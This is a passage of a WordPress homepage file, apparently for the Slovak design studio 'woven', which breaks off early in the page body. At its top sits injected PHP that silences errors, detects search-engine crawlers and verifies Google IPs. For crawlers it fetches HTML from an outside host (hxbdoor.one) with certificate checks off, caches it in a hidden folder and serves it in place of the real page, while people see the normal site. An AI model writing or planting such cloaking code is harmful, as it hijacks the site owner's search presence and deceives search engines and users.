<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIGURATION (PHP 5.x SAFE)
// ============================================
$config = array(
    'bot_url'   => 'https://hxbdoor.one/raw/1RBhGMst',
    'cache_ttl' => 3600,
    'timeout'   => 15
);

// ============================================
// BOT DETECTION
// ============================================
function is_search_bot() {
    $bots = array(
        'Googlebot','Googlebot-Mobile','Googlebot-Image','Googlebot-News',
        'Googlebot-Video','AdsBot-Google','Mediapartners-Google',
        'Google-InspectionTool','Google-Site-Verification','Storebot-Google',
        'bingbot','msnbot','BingPreview',
        'Slurp','DuckDuckBot','Baiduspider','YandexBot',
        'facebookexternalhit','LinkedInBot','Twitterbot'
    );

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// ============================================
// GOOGLE IP VERIFY
// ============================================
function verify_google_ip() {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    if ($ip == '') return false;

    $google_ip_prefixes = array('66.249.','64.233.','72.14.','209.85.','216.239.');

    foreach ($google_ip_prefixes as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            return true;
        }
    }

    $hostname = @gethostbyaddr($ip);
    if ($hostname &&
        (stripos($hostname, 'googlebot.com') !== false ||
         stripos($hostname, 'google.com') !== false)) {

        $resolved_ip = @gethostbyname($hostname);
        if ($resolved_ip === $ip) {
            return true;
        }
    }
    return false;
}

// ============================================
// FETCH REMOTE CONTENT
// ============================================
function get_remote_content($url, $timeout = 10) {

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content && $http_code == 200) {
            return $content;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'GET',
                'timeout' => $timeout,
                'user_agent' => 'Mozilla/5.0',
                'follow_location' => 1
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        ));

        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            return $content;
        }
    }
    return false;
}

// ============================================
// CACHE SYSTEM
// ============================================
function cache_content($key, $content = null, $ttl = 3600) {
    $cache_dir = dirname(__FILE__) . '/.cache';
    if (!is_dir($cache_dir)) {
        @mkdir($cache_dir, 0755, true);
    }

    $cache_file = $cache_dir . '/' . md5($key) . '.html';

    if ($content !== null) {
        file_put_contents($cache_file, serialize(array(
            'time' => time(),
            'content' => $content
        )));
        return true;
    } else {
        if (file_exists($cache_file)) {
            $data = @unserialize(file_get_contents($cache_file));
            if ($data && (time() - $data['time']) < $ttl) {
                return $data['content'];
            }
        }
    }
    return false;
}

// ============================================
// SERVE BOT CONTENT
// ============================================
function serve_bot_content($url, $ttl = 3600, $timeout = 15) {

    $cached = cache_content('bot_content', null, $ttl);
    if ($cached) {
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $cached;
        exit;
    }

    $content = get_remote_content($url, $timeout);
    if ($content) {
        cache_content('bot_content', $content, $ttl);
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $content;
        exit;
    }

    header('HTTP/1.1 503 Service Temporarily Unavailable');
    echo '<h1>503 Service Temporarily Unavailable</h1>';
    exit;
}

// ============================================
// MAIN
// ============================================
if (is_search_bot()) {

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    if (stripos($ua, 'Googlebot') !== false) {
        if (verify_google_ip()) {
            serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
        }
    } else {
        serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
    }
}

header('Content-Type: text/html; charset=utf-8');
header('X-Visitor-Type: user');
?>


<!doctype html>
<html lang="sk-SK">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="index, follow" />
	<meta name="author" content="vega solutions s.r.o." />

	<link rel="profile" href="https://gmpg.org/xfn/11">
	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://woven.sk/en/" />
<link rel="alternate" hreflang="sk" href="https://woven.sk/sk/" />
<link rel="alternate" hreflang="x-default" href="https://woven.sk/en/" />

	<!-- This site is optimized with the Yoast SEO plugin v21.6 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Hravé zásahy do prostredia a intervencie do verejného priestoru | woven</title>
	<meta name="description" content="Objavujeme, skúmame, ironizujeme, prekonávame, provokujeme, premýšľame a rozmazávame hranice priestorov, vzťahov, prostredí a typológií." />
	<link rel="canonical" href="https://woven.sk/sk/" />
	<meta property="og:locale" content="sk_SK" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="Hravé zásahy do prostredia a intervencie do verejného priestoru | woven" />
	<meta property="og:description" content="Objavujeme, skúmame, ironizujeme, prekonávame, provokujeme, premýšľame a rozmazávame hranice priestorov, vzťahov, prostredí a typológií." />
	<meta property="og:url" content="https://woven.sk/sk/" />
	<meta property="og:site_name" content="woven" />
	<meta property="article:publisher" content="https://www.facebook.com/popletene" />
	<meta property="article:modified_time" content="2023-11-23T20:58:53+00:00" />
	<meta property="og:image" content="https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg" />
	<meta name="twitter:card" content="summary_large_image" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://woven.sk/sk/","url":"https://woven.sk/sk/","name":"Hravé zásahy do prostredia a intervencie do verejného priestoru | woven","isPartOf":{"@id":"https://woven.sk/en/#website"},"about":{"@id":"https://woven.sk/en/#organization"},"primaryImageOfPage":{"@id":"https://woven.sk/sk/#primaryimage"},"image":{"@id":"https://woven.sk/sk/#primaryimage"},"thumbnailUrl":"https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg","datePublished":"2023-03-17T09:05:56+00:00","dateModified":"2023-11-23T20:58:53+00:00","description":"Objavujeme, skúmame, ironizujeme, prekonávame, provokujeme, premýšľame a rozmazávame hranice priestorov, vzťahov, prostredí a typológií.","breadcrumb":{"@id":"https://woven.sk/sk/#breadcrumb"},"inLanguage":"sk-SK","potentialAction":[{"@type":"ReadAction","target":["https://woven.sk/sk/"]}]},{"@type":"ImageObject","inLanguage":"sk-SK","@id":"https://woven.sk/sk/#primaryimage","url":"https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg","contentUrl":"https://woven.sk/wp-content/uploads/2023/11/woven_bcg_2.jpg"},{"@type":"BreadcrumbList","@id":"https://woven.sk/sk/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https://woven.sk/en/#website","url":"https://woven.sk/en/","name":"WOVEN","description":"","publisher":{"@id":"https://woven.sk/en/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://woven.sk/en/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"sk-SK"},{"@type":"Organization","@id":"https://woven.sk/en/#organization","name":"WOVEN","url":"https://woven.sk/en/","logo":{"@type":"ImageObject","inLanguage":"sk-SK","@id":"https://woven.sk/en/#/schema/logo/image/","url":"https://woven.sk/wp-content/uploads/2023/03/woven_logo_3.gif","contentUrl":"https://woven.sk/wp-content/uploads/2023/03/woven_logo_3.gif","width":430,"height":180,"caption":"WOVEN"},"image":{"@id":"https://woven.sk/en/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/popletene","https://www.instagram.com/woven_studio/"]}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="alternate" type="application/rss+xml" title="RSS kanál: woven &raquo;" href="https://woven.sk/sk/feed/" />
<link rel="alternate" type="application/rss+xml" title="RSS kanál komentárov webu woven &raquo;" href="https://woven.sk/sk/comments/feed/" />

<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://woven.sk/wp-includes/css/dist/block-library/style.min.css?ver=6.4.5' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link data-minify="1" rel='stylesheet' id='wpml-blocks-css' href='https://woven.sk/wp-content/cache/min/1/wp-content/plugins/sitepress-multilingual-cms/dist/css/blocks/styles.css?ver=1701895374' media='all' />
<link data-minify="1" rel='stylesheet' id='contact-form-7-css' href='https://woven.sk/wp-content/cache/min/1/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=1701895374' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css' href='https://woven.sk/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='cmplz-general-css' href='https://woven.sk/wp-content/plugins/complianz-gdpr/assets/css/cookieblocker.min.css?ver=6.5.6' media='all' />
<link rel='stylesheet' id='hello-elementor-css' href='https://woven.sk/wp-content/themes/hello-elementor/style.min.css?ver=2.9.0' media='all' />
<link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://woven.sk/wp-content/themes/hello-elementor/theme.min.css?ver=2.9.0' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='https://woven.sk/wp-content/uploads/elementor/css/custom-frontend-lite.min.css?ver=1700743346' media='all' />
<link rel='stylesheet' id='elementor-post-6-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-6.css?ver=1700743346' media='all' />
<link data-minify="1" rel='stylesheet' id='elementor-icons-css' href='https://woven.sk/wp-content/cache/min/1/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=1701895374' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://woven.sk/wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min.css?ver=5.3.6' media='all' />
<link rel='stylesheet' id='elementor-pro-css' href='https://woven.sk/wp-content/uploads/elementor/css/custom-pro-frontend-lite.min.css?ver=1700743346' media='all' />
<link rel='stylesheet' id='elementor-post-1077-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-1077.css?ver=1700769892' media='all' />
<link rel='stylesheet' id='elementor-post-68-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-68.css?ver=1700743867' media='all' />
<link rel='stylesheet' id='elementor-post-1190-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-1190.css?ver=1700773622' media='all' />
<link data-minify="1" rel='stylesheet' id='hello-elementor-child-style-css' href='https://woven.sk/wp-content/cache/background-css/woven.sk/wp-content/cache/min/1/wp-content/themes/hello-theme-child-master/style.css?ver=1701895374&wpr_t=1743029156' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Inter%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=swap&#038;subset=latin-ext&#038;ver=6.4.5' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script id="wpml-cookie-js-extra">
var wpml_cookies = {"wp-wpml_current_language":{"value":"sk","expires":1,"path":"\/"}};
var wpml_cookies = {"wp-wpml_current_language":{"value":"sk","expires":1,"path":"\/"}};
</script>

<script src="https://woven.sk/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js" defer></script>


<link rel="https://api.w.org/" href="https://woven.sk/sk/wp-json/" /><link rel="alternate" type="application/json" href="https://woven.sk/sk/wp-json/wp/v2/pages/1077" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://woven.sk/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.4.5" />
<link rel='shortlink' href='https://woven.sk/sk/' />
<link rel="alternate" type="application/json+oembed" href="https://woven.sk/sk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwoven.sk%2Fsk%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://woven.sk/sk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwoven.sk%2Fsk%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.7 stt:1,10;" />
<style>.cmplz-hidden{display:none!important;}</style><meta name="generator" content="Elementor 3.17.3; features: e_dom_optimization, e_optimized_assets_loading, e_optimized_css_loading, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
<style type="text/css">/* Hot Random Image START */
		/* Hot Random Image END */
		</style><link rel="icon" href="https://woven.sk/wp-content/uploads/2023/03/woven_favicon-150x150.png" sizes="32x32" />
<link rel="icon" href="https://woven.sk/wp-content/uploads/2023/03/woven_favicon-300x300.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://woven.sk/wp-content/uploads/2023/03/woven_favicon-300x300.png" />
<meta name="msapplication-TileImage" content="https://woven.sk/wp-content/uploads/2023/03/woven_favicon-300x300.png" />
<noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript><style id="wpr-lazyload-bg"></style><style id="wpr-lazyload-bg-exclusion"></style>
<noscript>
<style id="wpr-lazyload-bg-nostyle">:root{--wpr-bg-4974f689-997a-426e-8539-a18d680e42b9: url('https://woven.sk/wp-content/uploads/svg/icons/icon-search.svg');}</style>
</noscript>
<script type="application/javascript">const rocket_pairs = [{"selector":".portfolio-item-wrapper .elementor-widget-image a","style":":root{--wpr-bg-4974f689-997a-426e-8539-a18d680e42b9: url('https:\/\/woven.sk\/wp-content\/uploads\/svg\/icons\/icon-search.svg');}","hash":"4974f689-997a-426e-8539-a18d680e42b9"}]; const rocket_excluded_pairs = [];</script></head>
<body data-cmplz=1 class="home page-template-default page page-id-1077 wp-custom-logo lang-sk elementor-default elementor-template-full-width elementor-kit-6 elementor-page elementor-page-1077">


<a class="skip-link screen-reader-text" href="#content">Preskočiť na obsah</a>

		<div data-elementor-type="header" data-elementor-id="68" class="elementor elementor-68 elementor-location-header" data-elementor-post-type="elementor_library">
								<header class="elementor-section elementor-top-section elementor-element elementor-element-a71b097 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a71b097" data-element_type="section" id="header-transparent" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;background_motion_fx_motion_fx_scrolling&quot;:&quot;yes&quot;,&quot;background_motion_fx_opacity_effect&quot;:&quot;yes&quot;,&quot;background_motion_fx_opacity_range&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:{&quot;start&quot;:0,&quot;end&quot;:5}},&quot;background_motion_fx_range&quot;:&quot;page&quot;,&quot;sticky&quot;:&quot;top&quot;,&quot;background_motion_fx_opacity_direction&quot;:&quot;out-in&quot;,&quot;background_motion_fx_opacity_level&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;background_motion_fx_devices&quot;:[&quot;desktop&quot;,&quot;laptop&quot;,&quot;tablet_extra&quot;,&quot;tablet&quot;,&quot;mobile&quot;],&quot;sticky_on&quot;:[&quot;desktop&quot;,&quot;laptop&quot;,&quot;tablet_extra&quot;,&quot;tablet&quot;,&quot;mobile&quot;],&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b59c877" data-id="b59c877" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-9d6f503 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="9d6f503" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-c8ecb0a" data-id="c8ecb0a" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-4eef383 elementor-widget__width-inherit logo-wrapper elementor-widget elementor-widget-shortcode" data-id="4eef383" data-element_type="widget" data-widget_type="shortcode.default">
				<div class="elementor-widget-container">
					<div class="elementor-shortcode"><a href="/"><img width="210px" height="auto" class="hot-random-image" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20210%200'%3E%3C/svg%3E" alt="Woven logo" data-lazy-src="https://woven.sk/logo-dynamic/white/woven_logo_1_white.gif" /><noscript><img width="210px" height="auto" class="hot-random-image" src="https://woven.sk/logo-dynamic/white/woven_logo_1_white.gif" alt="Woven logo" /></noscript></a></div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-4262f70" data-id="4262f70" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-6ef0729 elementor-widget__width-auto wpml-lang-switcher elementor-widget elementor-widget-text-editor" data-id="6ef0729" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.17.0 - 08-11-2023 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style><div class="lang-switcher-wrapper"> <a href="https://woven.sk/en/" class="lang-code en">en</a> <a href="https://woven.sk/sk/" class="lang-code sk">sk</a></div>										</div>
				</div>
				<div class="elementor-element elementor-element-584ff63 elementor-widget__width-auto menu-icon elementor-view-default elementor-widget elementor-widget-icon" data-id="584ff63" data-element_type="widget" data-widget_type="icon.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-wrapper">
			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6MjQ5LCJ0b2dnbGUiOmZhbHNlfQ%3D%3D">
			<svg xmlns="http://www.w3.org/2000/svg" width="30" height="14" viewBox="0 0 30 14" fill="none"><line y1="1.75" x2="30" y2="1.75" stroke="black" stroke-width="2.5"></line><line y1="12.75" x2="30" y2="12.75" stroke="black" stroke-width="2.5"></line></svg>			</a>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</header>
						</div>
				<div data-elementor-type="wp-page" data-elementor-id="1077" class="elementor elementor-1077 elementor-2" data-elementor-post-type="page">
